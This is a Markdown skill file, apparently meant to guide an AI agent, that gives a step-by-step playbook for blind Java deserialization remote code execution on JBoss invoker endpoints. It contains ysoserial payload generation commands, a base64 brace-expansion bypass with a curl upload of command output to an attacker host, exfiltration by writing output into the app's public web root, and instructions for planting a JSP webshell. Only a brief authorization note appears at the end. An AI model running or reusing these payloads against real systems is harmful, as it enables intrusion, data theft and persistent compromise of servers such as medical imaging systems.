---
name: jboss-blind-rce-oracle
description: Use on blind Java deser probes to prove RCE via exceptions.
---

# JBoss Blind Deserialization RCE — Exception Oracle Playbook

Class-level playbook for blind Java deserialization exploitation on classic JBoss (4.x/5.x/6.x)
invoker stacks, derived from a fully-verified 2026-09 engagement (JBoss 4.2.3.GA + Java 7 +
nginx front, dcm4chee PACS). Applies to any Java app that deserializes untrusted bodies
without authentication — not just JBoss.

## Contents

- [Why timing/sleep fails](#why-timingsleep-fails-and-what-actually-works)
- [Exception-class oracle](#exception-class-oracle-the-working-method)
- [First-touch probes on classic JBoss](#first-touch-probes-on-classic-jboss-order-matters)
- [Payload generation](#generating-payloads--execstring-vs-metacharacter-pitfall)
- [exec(String) metacharacter workarounds](#execstring-cant-run-shell-metacharacters--two-workarounds)
- [No-egress exfiltration](#no-egress-exfiltration-via-the-apps-own-static-handler)
- [Chain to full RCE](#how-this-chains-to-a-full-rce-verified-sequence)

Full session detail (exact commands, tool paths, exception message variants, custom payload
recipe) is in `references/jboss-blind-rce-oracle.md`.

## Why timing/sleep fails and what actually works

Blind RCE confirmation via "does the response get slower when I send sleep 70" is a common
wrong assumption for exec-based gadget chains. `Runtime.exec(String)` is NON-BLOCKING — it
spawns a child process and returns a Process object immediately; the JVM does not block until
the child exits. So `Runtime.exec("sleep 70")` delays the response by ~0ms even though the
sleep process runs for 70s in the background. Do NOT use response delay to prove/deny exec RCE.

(For Thread.sleep-based chains — CC5/CC7 variants that invoke an Object rather than Runtime
— timing DOES work; this playbook covers the exec() transformer chains CC1/CC6 and friends.)

## Exception-class oracle (the working method)

Compare response exception CLASS across two payloads, one with a valid command and one with
garbage. Gadget side effects happen INSIDE readObject; whatever the server then tries to do
with the (already-executed) result produces a stable, command-dependent exception class.

| Command placed in chain | Server response exception | Meaning |
|---|---|---|
| Valid command (`touch /tmp/a`, `id`, any binary that exists) | `java.lang.ClassCastException: java.lang.Integer cannot be cast to java.util.Set` (stack shows AnnotationInvocationHandler.readObject / Proxy entrySet) | exec() SUCCEEDED — returned a Process whose Integer hashCode can't cast to Set, which is what the framework was expecting |
| Invalid command (`/nonexistent_xyz`) | `org.apache.commons.collections.FunctorException: InvokerTransformer: The method 'exec' on 'class java.lang.Runtime' threw an exception` | exec() FAILED — process never spawned (command not found) |
| Command containing space/pipe/redirect (with exec(String) chain) | Same FunctorException as above | exec(String) doesn't shell-interpret; StringTokenizer splits on whitespace so the intended shell semantics are lost at argv level |

Decision rule: **different exception for a valid vs invalid command = live RCE oracle**, even
with zero outbound connectivity, zero response delay, and a fully blind target.

## First-touch probes on classic JBoss (order matters)

1. `GET /invoker/readonly` with empty body → HTTP 500 + stack trace mentioning
   `java.io.EOFException … ObjectInputStream.readStreamHeader … ReadOnlyAccessFilter.doFilter`.
   Verified: deserialization endpoint reachable without auth even with an EMPTY body — no
   payload needed yet to classify the surface as deser-open.
2. `GET /invoker/JMXInvokerServlet` and `/invoker/EJBInvokerServlet` → if HTTP 200 with
   `Content-Type: application/x-java-serialized-object`, both are deser-capable as well.
3. Response errors after POSTing payloads that mention `InvocationException`,
   `ClassNotFoundException`, `ClassCastException` ⇒ the server got PAST readObject with the
   deserialized object in its hands — the gadget chain inside had its execution chance.

## Generating payloads — exec(String) vs metacharacter pitfall

Working generator this session: `~/Tools/ysoserial-java/ysoserial-all.jar`
(ysoserial v0.0.6, frohoff releases, ~60MB). Beware: sibling `~/Tools/ysoserial/` holds the
DIFFERENT `ysoserial.exe` .NET/portable variant — don't confuse them. If missing:

```bash
curl -fsSL -o ysoserial-all.jar \
  https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
```

Generate (verified on Kali Java 25 generator; target ran Java 7 — `--add-opens` is only for
the generator JVM, not the victim):

```bash
cd ~/Tools/ysoserial-java
java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
     --add-opens java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections6 "touch /tmp/test" > payload.bin
```

Flags & gotchas verified this session:
- BOTH `--add-opens` flags needed on the generator JVM; missing →
  `InaccessibleObjectException: Unable to make field transient java.util.HashMap
  java.util.HashSet.map accessible … module java.base does not "opens java.util"`
  → exit 70, no output file.
- Validate output: `xxd payload.bin | head -1` → must start `aced 0005` (Java serialized
  magic). Typical size ~1288 bytes for CC6 with short command. `strings payload.bin` should
  show `HashSet / TiedMapEntry / LazyMap / ChainedTransformer / InvokerTransformer /
  getRuntime` and your command string.
- Jar filenames vary across releases (`ysoserial-plus.jar`, `ysoserial-all*.jar` — check
  actual filename before scripting).
- **Local JVM cannot validate the payload** — the gadget fires only inside the victim's
  readObject, not during generation. Never write off a payload because running it locally
  produced no side effects; only exception differential on the target counts.

### exec(String) can't run shell metacharacters — two workarounds

ysoserial CC1/CC6 pass ONE string to `Runtime.exec(String)`, which StringTokenizer-splits on
spaces; redirects/pipes/quotes become literal argv tokens with no shell semantics. Two fixes:

1. **(Fastest) Bash brace expansion bypass** — no space anywhere in the exec'd command:

```bash
echo -n "id > /tmp/pwn && curl -T /tmp/pwn http://me:8000" | base64 -w0   # → B64OUTPUT
java --add-opens java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections6 \
  "bash -c {echo,B64OUTPUT}|{base64,-d}|bash" > payload.bin
```

   The `{echo,…}|{base64,-d}|bash` part contains no spaces; brace expansion happens inside
   the bash the TARGET spawns, so the payload retains redirect/pipe/subshell power.

2. **(Robust) Custom exec(String[]) chain** — replace `exec(String)` with
   `exec(new String[]{"/bin/sh","-c", cmd})` in a custom-built transformer array.
   Custom CC1 variant compiled in-memory (javac with ysoserial-all.jar as classpath)
   verified this session — payload ≈1438 bytes, magic `aced 0005`, distinguishes valid vs
   invalid command cleanly. See `references/jboss-blind-rce-oracle.md` for the Java fragment.

## No-egress exfiltration via the app's own static handler

When the target has NO outbound network (firewalled PACS, no DNS/HTTP callback), exfil
through a directory the application serves WITHOUT authentication, then read it back over
the same port:

```bash
# 1. locate the web root from a known unauth static asset:
java … CommonsCollections6 "find / -type f -name 'favicon.png' -path '*/images/*'" > p.bin
# 2. redirect command output into that directory:
java … CommonsCollections6 "id > /usr/local/jboss/server/www/images/r.txt"
# 3. read it back through normal HTTP:
curl http://target:8088/images/r.txt
#   → e.g. "uid=0(root) gid=0(root) groups=0(root)"
```

Also useful: `env > …/env.txt` (JBOSS_HOME, PATH, deploy hints);
`ls -la $JBOSS_HOME/server/<conf>/deploy/ > …/ls.txt` (reveals http-invoker.sar /
invoker.war layout for further staging).

## How this chains to a full RCE (verified sequence)

1. Probe `/invoker/readonly` with empty GET → confirm 500 EOFException (deser surface).
2. Generate CC6 valid + invalid command payloads → exception differential ⇒ blind RCE confirmed.
3. Hit the exec(String) metachar wall → brace-expansion bypass (no recompile) or
   custom exec(String[]) chain (recompile).
4. Locate web root through static assets (favicon.png, css/js paths in landing page).
5. Write a JSP webshell (`Runtime.exec(new String[]{"/bin/sh","-c",request.getParameter("c")})`)
   into the web root or exploded WAR dir; request via the app's normal port/path.
6. Confirm `uid=0` from the webshell; then remediate — remove http-invoker.sar entirely, clean
   persistence (webshell files, /tmp/jex*, /tmp/rce_*).

## Tool false-positive warning

Automated exploit tools sometimes report "deployed successfully" purely off HTTP status of a
follow-up probe (e.g. a tool checks `/jexinv4/jexinv4.jsp` gets HTTP 200 — but that path
returns the app's normal login page on this target class and gets taken as deploy-success).
Treat a tool's "implanted/deployed" report as unverified; confirm through the exception
oracle or an artifact you fully control.

## Safety / authorization

Deserialization exploitation is arbitrary code execution on the target host. Only run against
systems you have explicit written permission to test; instrument everything so you can
justify every side effect in the finding report.
